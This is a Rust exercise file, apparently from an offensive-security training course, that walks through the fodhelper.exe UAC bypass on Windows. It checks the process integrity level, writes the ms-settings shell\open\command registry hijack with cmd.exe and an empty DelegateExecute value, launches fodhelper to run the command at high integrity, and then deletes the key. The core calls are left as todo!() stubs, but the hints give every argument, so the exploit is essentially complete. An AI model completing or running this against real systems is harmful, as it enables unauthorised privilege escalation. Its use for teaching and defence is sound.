use std::ffi::c_void;
use std::mem;
use std::thread;
use std::time::Duration;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Security::{
    GetTokenInformation, TokenIntegrityLevel, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
};
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExA, RegDeleteKeyA, RegSetValueExA,
    HKEY_CURRENT_USER, KEY_SET_VALUE, REG_OPTION_NON_VOLATILE, REG_SZ,
};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows::Win32::UI::Shell::ShellExecuteA;
use windows::Win32::UI::WindowsAndMessaging::SW_SHOW;

// Well-known integrity level RIDs (the last sub-authority in the integrity SID)
const SECURITY_MANDATORY_LOW_RID: u32 = 0x1000;
const SECURITY_MANDATORY_MEDIUM_RID: u32 = 0x2000;
const SECURITY_MANDATORY_HIGH_RID: u32 = 0x3000;
const SECURITY_MANDATORY_SYSTEM_RID: u32 = 0x4000;

fn main() {
    unsafe {
        // Step 1 — Query and print the current process integrity level.
        // Open the current process token, then call GetTokenInformation with
        // TokenIntegrityLevel to retrieve a TOKEN_MANDATORY_LABEL structure.
        // The integrity level RID is the last sub-authority of the label SID.
        //
        // Hint: OpenProcessToken(
        //     ProcessHandle: HANDLE,          // GetCurrentProcess()
        //     DesiredAccess: TOKEN_ACCESS_MASK, // TOKEN_QUERY
        //     TokenHandle: *mut HANDLE,       // &mut hToken
        // ) -> Result<()>
        //
        // Then: GetTokenInformation(
        //     TokenHandle: HANDLE,             // hToken
        //     TokenInformationClass: TOKEN_INFORMATION_CLASS, // TokenIntegrityLevel
        //     TokenInformation: Option<*mut c_void>, // pointer to buffer
        //     TokenInformationLength: u32,     // buffer size
        //     ReturnLength: *mut u32,          // out: required size
        // ) -> Result<()>
        //
        // The buffer holds a TOKEN_MANDATORY_LABEL. The Label.Sid field points to
        // a SID whose last sub-authority is the integrity RID.
        // Use GetSidSubAuthorityCount + GetSidSubAuthority to extract it.
        let mut htoken = HANDLE::default();
        todo!("OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut htoken)");

        // First call with zero-length buffer to discover the required size
        let mut needed: u32 = 0;
        let _ = GetTokenInformation(htoken, TokenIntegrityLevel, None, 0, &mut needed);

        let mut buf = vec![0u8; needed as usize];
        todo!(
            "GetTokenInformation(htoken, TokenIntegrityLevel, Some(buf.as_mut_ptr() as *mut c_void), needed, &mut needed)"
        );

        // Cast buffer to TOKEN_MANDATORY_LABEL and extract the integrity RID
        let tml = buf.as_ptr() as *const TOKEN_MANDATORY_LABEL;
        todo!("extract the last sub-authority from (*tml).Label.Sid using GetSidSubAuthorityCount + GetSidSubAuthority");
        // Then match the RID:
        //   SECURITY_MANDATORY_LOW_RID    => "Low"
        //   SECURITY_MANDATORY_MEDIUM_RID => "Medium"
        //   SECURITY_MANDATORY_HIGH_RID   => "High"
        //   SECURITY_MANDATORY_SYSTEM_RID => "System"
        // Print it: println!("Current integrity level: {level}");

        CloseHandle(htoken).ok();

        // Step 2 — Write the fodhelper registry hijack.
        // fodhelper.exe reads HKCU\Software\Classes\ms-settings\shell\open\command
        // before it auto-elevates to high integrity.
        // Writing a command there causes fodhelper to execute it at high integrity.
        //
        // Hint: RegCreateKeyExA(
        //     hKey: HKEY,                    // HKEY_CURRENT_USER
        //     lpSubKey: PCSTR,               // b"Software\\Classes\\ms-settings\\shell\\open\\command\0"
        //     Reserved: u32,                 // 0
        //     lpClass: PCSTR,                // PCSTR::null()
        //     dwOptions: REG_OPEN_CREATE_OPTIONS, // REG_OPTION_NON_VOLATILE
        //     samDesired: REG_SAM_FLAGS,     // KEY_SET_VALUE
        //     lpSecurityAttributes: Option<*const SECURITY_ATTRIBUTES>, // None
        //     phkResult: *mut HKEY,          // &mut hkey
        //     lpdwDisposition: Option<*mut REG_OPEN_CREATE_OPTIONS_VALUE>, // None
        // ) -> WIN32_ERROR
        let mut hkey = windows::Win32::System::Registry::HKEY::default();
        todo!("RegCreateKeyExA(HKEY_CURRENT_USER, \"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\", ...)");

        // Set the default value (the command to run at high integrity — use "cmd.exe" for the exercise)
        // RegSetValueExA(hkey, PCSTR::null(), 0, REG_SZ, data_ptr, data_len)
        let command = b"cmd.exe\0";
        todo!("RegSetValueExA(hkey, PCSTR::null(), 0, REG_SZ, command.as_ptr(), command.len() as u32)");

        // Set DelegateExecute to an empty string — required to activate the hijack
        let empty = b"\0";
        todo!("RegSetValueExA(hkey, PCSTR(b\"DelegateExecute\\0\".as_ptr()), 0, REG_SZ, empty.as_ptr(), empty.len() as u32)");

        RegCloseKey(hkey).ok();
        println!("Registry hijack written.");

        // Step 3 — Launch fodhelper.exe to trigger the hijack.
        // fodhelper.exe is an auto-elevate binary in System32. When it starts, it reads
        // the registry key we just wrote and executes our command at high integrity.
        //
        // Hint: ShellExecuteA(
        //     hwnd: HWND,           // HWND::default()
        //     lpoperation: PCSTR,   // PCSTR(b"open\0".as_ptr())
        //     lpfile: PCSTR,        // PCSTR(b"fodhelper.exe\0".as_ptr())
        //     lpparameters: PCSTR,  // PCSTR::null()
        //     lpdirectory: PCSTR,   // PCSTR::null()
        //     nshowcmd: SHOW_WINDOW_CMD, // SW_SHOW
        // ) -> HINSTANCE            // value > 32 means success
        todo!("ShellExecuteA to launch fodhelper.exe");
        println!("fodhelper.exe triggered — waiting for it to execute the payload...");

        // Step 4 — Wait for fodhelper to start and execute our command.
        thread::sleep(Duration::from_secs(2));

        // Step 5 — Clean up the registry key.
        // Leaving the key in place is a persistence artefact — always clean up.
        //
        // Hint: RegDeleteKeyA(
        //     hKey: HKEY,       // HKEY_CURRENT_USER
        //     lpSubKey: PCSTR,  // b"Software\\Classes\\ms-settings\\shell\\open\\command\0"
        // ) -> WIN32_ERROR
        todo!("RegDeleteKeyA(HKEY_CURRENT_USER, \"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\")");
        println!("Registry key cleaned up.");

        // Verify: in the spawned cmd.exe window, run: whoami /groups
        // You should see "Mandatory Label\\High Mandatory Level" in the output.
    }
}
